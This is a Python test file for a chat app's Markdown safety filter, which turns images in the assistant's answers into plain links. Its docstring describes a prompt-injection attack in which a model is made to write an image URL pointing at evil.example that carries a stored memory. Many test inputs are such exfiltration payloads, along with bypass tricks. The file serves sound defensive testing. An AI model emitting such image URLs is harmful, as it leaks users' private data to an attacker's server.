"""Images in Lili's answers are never fetched by themselves (P20).

The Markdown control loads an image as soon as it is drawn. A prompt injection
could make the model write ![](https://evil.example/?d=<a memory>) - so in her
answers images become links, and nothing that draws as an image is left.
"""

from __future__ import annotations

import flet as ft
import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from views.chat_message import ChatMessage
from views.markdown_safety import IMAGE_MARK, WORD_JOINER, disarm_images

FENCE = "`" * 3
LINK = f"{WORD_JOINER}[{IMAGE_MARK} "


def draws_no_image(text: str) -> bool:
    return "![" not in text and "<img" not in text.lower()


@pytest.mark.parametrize(
    ("written", "shown"),
    [
        ("![диаграма](https://e.x/a.png)", f"{LINK}диаграма](https://e.x/a.png)"),
        ("виж ![](https://e.x/?d=1) тук", f"виж {LINK}](https://e.x/?d=1) тук"),
        (
            '![a](https://e.x/a.png "заглавие")',
            f'{LINK}a](https://e.x/a.png "заглавие")',
        ),
        ("![a][1]\n\n[1]: https://e.x/a.png", f"{LINK}a][1]\n\n[1]: https://e.x/a.png"),
        (
            "![data](data:image/png;base64,AAAA)",
            f"{LINK}data](data:image/png;base64,AAAA)",
        ),
        (
            '<img src="https://e.x/a.png" alt="лого">',
            f"{WORD_JOINER}[{IMAGE_MARK} лого](https://e.x/a.png)",
        ),
        (
            "<IMG SRC=https://e.x/a.png>",
            f"{WORD_JOINER}[{IMAGE_MARK}](https://e.x/a.png)",
        ),
        ("<img alt='без адрес'>", f"{IMAGE_MARK} без адрес"),
    ],
    ids=[
        "inline",
        "no-alt",
        "title",
        "reference",
        "data-uri",
        "img-tag",
        "img-tag-unquoted",
        "img-tag-no-src",
    ],
)
def test_an_image_becomes_a_link(written, shown):
    assert disarm_images(written) == shown


def test_text_without_images_is_left_alone():
    text = "Внимание! [бележка] и [връзка](https://e.x) и `код` и <b>тег</b>"
    assert disarm_images(text) is text


@pytest.mark.parametrize(
    "code",
    [
        f"{FENCE}markdown\n![alt](https://e.x/a.png)\n{FENCE}\n",
        "~~~\n![alt](https://e.x/a.png)\n<img src=x>\n~~~\n",
        "`![alt](https://e.x/a.png)`",
        # Still being streamed: the fence is not closed yet, the control draws code.
        f"{FENCE}python\nprint('![alt](https://e.x/a.png)')\n",
    ],
    ids=["fenced", "tilde-with-tag", "inline-code", "unclosed-fence"],
)
def test_code_looks_the_same_and_only_hides_an_invisible_split(code):
    shown = disarm_images(code)

    assert draws_no_image(shown)
    assert shown.replace(WORD_JOINER, "") == code


def test_an_escaped_exclamation_mark_keeps_showing_as_a_mark_and_a_link():
    # "\![x](u)" is "!" plus a link already: it is only split, not relabelled.
    assert disarm_images("\\![не](https://e.x)") == f"\\!{WORD_JOINER}[не](https://e.x)"


def test_a_backtick_in_the_info_string_opens_no_code_block():
    # So what follows is prose and the image becomes a visible link.
    shown = disarm_images(f"{FENCE}a`b\n![x](https://e.x)")

    assert shown.endswith(f"{LINK}x](https://e.x)")


def test_a_tag_still_being_streamed_is_split_and_becomes_a_link_once_whole():
    message = ChatMessage("assistant", "")

    message.append_text('<img src="https://evil.example/?d=1"')
    assert draws_no_image(message.md.value)

    message.append_text(">")
    assert message.md.value == f"{WORD_JOINER}[{IMAGE_MARK}](https://evil.example/?d=1)"


def test_the_prose_after_a_code_block_is_disarmed_as_usual():
    shown = disarm_images(f"{FENCE}\n![код](https://a)\n{FENCE}\n![after](https://b)")

    assert shown.endswith(f"{LINK}after](https://b)")


@pytest.mark.parametrize(
    "tricky",
    [
        "!![x](https://evil/1)",  # a "!" in front must not rebuild the image
        "\\`![x](https://evil/2)`",  # an escaped backtick opens no code span
        f"{FENCE}a`b\n![x](https://evil/3)",  # a backtick in the info string: no fence
        "<div>\n" + FENCE + "\n</div>\n\n![x](https://evil/4)",  # a fence inside HTML
        "!<img src=https://evil/5>",
        "\\![x](https://evil/6)",  # escaped "!": a link already, kept that way
        "\\\\![x](https://evil/7)",  # an escaped backslash: an image again
        '<img src="https://evil/8?a=![b">',
    ],
)
def test_no_trick_leaves_anything_that_draws_as_an_image(tricky):
    assert draws_no_image(disarm_images(tricky))


# ------------------------------------------------ properties, for any text at all
# The safety must not rest on telling code from prose right: whatever the mixture
# of fences, backticks, escapes and tags, nothing is left to fetch. Hypothesis
# builds the mixtures from the pieces that matter and from arbitrary text, and
# shrinks a failure to the shortest text that still fails.
PIECES = [
    "![",
    "](https://evil/?d=1)",
    "[",
    "]",
    "(",
    ")",
    "!",
    "\\",
    "`",
    "``",
    FENCE,
    "~~~",
    "\n",
    "\r\n",
    "  ",
    "\t",
    "<img src=https://evil/x>",
    "<IMG",
    "<img",
    "<",
    " src=",
    ">",
    "текст ",
    "[1]: https://evil\n",
    WORD_JOINER,
]
MIXTURES = st.lists(
    st.one_of(st.sampled_from(PIECES), st.text(max_size=6)), max_size=16
).map("".join)
ANY_TEXT = MIXTURES | st.text()
# Plain prose around what a test builds: nothing in it is Markdown.
PROSE = st.text(alphabet="abcdеж ,.", max_size=12)
WORDS = st.from_regex(r"[a-z0-9]{0,6}( [a-z0-9]{1,6})?", fullmatch=True)
URLS = st.from_regex(
    r"https?://[a-z0-9]{1,8}\.[a-z]{2,3}(/[a-z0-9_]{0,8})?(\?d=[a-z0-9]{0,8})?",
    fullmatch=True,
)
# A line of code: no fence characters, no control characters, no invisible ones,
# so it can neither close a fence nor already hold a word joiner.
CODE_TEXT = st.text(
    alphabet=st.characters(
        blacklist_characters="`~", blacklist_categories=("Cs", "Cc", "Cf", "Zl", "Zp")
    ),
    max_size=10,
)
CODE_LINES = st.lists(
    st.one_of(
        st.sampled_from(["![alt](https://e.x/a.png)", "<img src=x>", "<IMG", "![", ""]),
        CODE_TEXT,
    ),
    max_size=6,
).map("\n".join)


@settings(max_examples=1000)
@given(ANY_TEXT)
def test_no_text_leaves_anything_that_draws_as_an_image(text):
    assert draws_no_image(disarm_images(text)), repr(text)


@given(ANY_TEXT)
def test_a_text_with_no_image_in_it_is_returned_as_it_is(text):
    if draws_no_image(text):
        assert disarm_images(text) is text


@given(ANY_TEXT)
def test_disarming_twice_changes_nothing(text):
    once = disarm_images(text)

    assert disarm_images(once) == once


@given(ANY_TEXT, st.lists(st.integers(0, 80), max_size=6))
def test_no_stage_of_a_streamed_answer_is_drawn_as_an_image(text, cuts):
    # However the chunks fall, the text drawn after each one is safe, and at the
    # end it is what disarming the whole answer gives.
    message = ChatMessage("assistant", "")
    edges = sorted({min(cut, len(text)) for cut in cuts} | {len(text)})
    start = 0

    for edge in edges:
        message.append_text(text[start:edge])
        start = edge
        assert draws_no_image(message.md.value), repr(text[:edge])

    assert message.text_value == text
    assert message.md.value == disarm_images(text)


@given(before=PROSE, alt=WORDS, url=URLS, after=PROSE)
def test_an_ordinary_image_becomes_exactly_one_visible_link(before, alt, url, after):
    written = f"{before}![{alt}]({url}){after}"

    assert disarm_images(written) == f"{before}{LINK}{alt}]({url}){after}"


@given(before=PROSE, alt=WORDS, url=URLS, after=PROSE)
def test_an_ordinary_img_tag_becomes_exactly_one_visible_link(before, alt, url, after):
    written = f'{before}<img src="{url}" alt="{alt}">{after}'
    # The text of the tag loses the spaces around it, as a link label does.
    label = f"{IMAGE_MARK} {alt.strip()}".strip()

    assert disarm_images(written) == f"{before}{WORD_JOINER}[{label}]({url}){after}"


@given(
    fence=st.sampled_from([FENCE, "~~~", FENCE + "`", "~~~~~"]),
    indent=st.integers(0, 3),
    info=st.from_regex(r"[a-z]{0,6}", fullmatch=True),
    body=CODE_LINES,
    closed=st.booleans(),
)
def test_code_looks_the_same_whatever_is_in_it(fence, indent, info, body, closed):
    code = f"{' ' * indent}{fence}{info}\n{body}\n" + (f"{fence}\n" if closed else "")

    shown = disarm_images(code)

    assert draws_no_image(shown)
    assert shown.replace(WORD_JOINER, "") == code


@given(fence=st.sampled_from([FENCE, "~~~"]), body=CODE_LINES, url=URLS)
def test_what_follows_a_closed_code_block_is_disarmed_as_prose(fence, body, url):
    written = f"{fence}\n{body}\n{fence}\n![x]({url})"

    assert disarm_images(written).endswith(f"{LINK}x]({url})")


@given(
    before=PROSE,
    code=st.from_regex(r"[a-z ]{0,5}(!\[|<img|<IMG)[a-z ]{0,5}", fullmatch=True),
    after=PROSE,
)
def test_inline_code_looks_the_same_whatever_is_in_it(before, code, after):
    written = f"{before}`{code}`{after}"

    shown = disarm_images(written)

    assert draws_no_image(shown)
    assert shown.replace(WORD_JOINER, "") == written


# ------------------------------------------------------------ the chat message
def test_an_answer_shows_the_link_and_keeps_the_text_as_written():
    written = "Ето: ![графика](https://evil.example/?d=спомен)"
    message = ChatMessage("assistant", written)

    assert draws_no_image(message.md.value)
    assert f"{IMAGE_MARK} графика](https://evil.example/?d=спомен)" in message.md.value
    assert message.text_value == written


def test_an_image_split_across_streamed_chunks_is_never_drawn():
    message = ChatMessage("assistant", "")

    # The chunk boundary falls inside the image, so disarming each piece on its
    # own would let the joined text draw as an image.
    for chunk in ["Ето: !", "[x](https://ev", "il.example/?d=1)", " край"]:
        message.append_text(chunk)
        assert draws_no_image(message.md.value)

    assert message.md.value == f"Ето: {LINK}x](https://evil.example/?d=1) край"
    assert message.text_value == "Ето: ![x](https://evil.example/?d=1) край"


@pytest.mark.asyncio
async def test_copy_gives_the_answer_as_it_was_written(mock_page, clipboard):
    written = "![x](https://e.x/a.png)"
    message = ChatMessage("assistant", written, page=mock_page)

    await message.copy_to_clipboard(None)

    assert clipboard == [written]
    # "Копирано" is said only after the text is really on the clipboard.
    assert isinstance(mock_page.show_dialog.call_args.args[0], ft.SnackBar)


def test_the_users_own_message_is_shown_as_written():
    # The threat is text the model was made to write; the user's own message
    # stays exactly as typed.
    written = "![моя](https://e.x/a.png)"

    assert ChatMessage("user", written).md.value == written
